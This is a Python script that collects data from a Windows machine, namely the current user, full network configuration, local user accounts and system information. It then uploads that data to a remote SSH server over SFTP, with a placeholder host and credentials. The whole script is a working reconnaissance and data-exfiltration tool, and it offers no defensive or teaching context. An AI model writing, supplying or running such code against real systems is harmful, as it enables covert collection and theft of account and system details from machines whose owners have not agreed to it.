import paramiko
import os
import getpass
import subprocess

# Define SSH parameters
ssh_host = "your_ssh_server_ip"
ssh_port = 22
ssh_username = "your_ssh_username"
ssh_password = "your_ssh_password"  # You can also prompt for password input if needed

# Function to execute command and capture output
def execute_command(command):
    try:
        # Execute command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)

# Function to gather user information
def gather_user_info():
    try:
        # Gather user data
        user_data = execute_command("whoami")  # Example: Get current username
        user_data += "\n" + execute_command("ipconfig /all")  # Example: Get network configuration
        user_data += "\n" + execute_command("net user")  # Example: Get user accounts

        # Gather system information
        system_info = execute_command("systeminfo")  # Example: Get system information

        return user_data, system_info
    except Exception as e:
        return str(e)

# Function to send data over SSH
def send_data_over_ssh(user_data, system_info):
    try:
        # Create SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to SSH server
        client.connect(ssh_host, port=ssh_port, username=ssh_username, password=ssh_password)

        # Open a SFTP session
        sftp = client.open_sftp()

        # Create a temporary file to store user data
        with sftp.file("/tmp/user_data.txt", "w") as file:
            file.write(user_data)

        # Create a temporary file to store system information
        with sftp.file("/tmp/system_info.txt", "w") as file:
            file.write(system_info)

        # Close SFTP session and SSH client
        sftp.close()
        client.close()

        print("Data sent over SSH successfully.")
    except Exception as e:
        print("Error:", e)

# Main function
def main():
    # Gather user information
    user_data, system_info = gather_user_info()

    # Send data over SSH
    send_data_over_ssh(user_data, system_info)

if __name__ == "__main__":
    main()
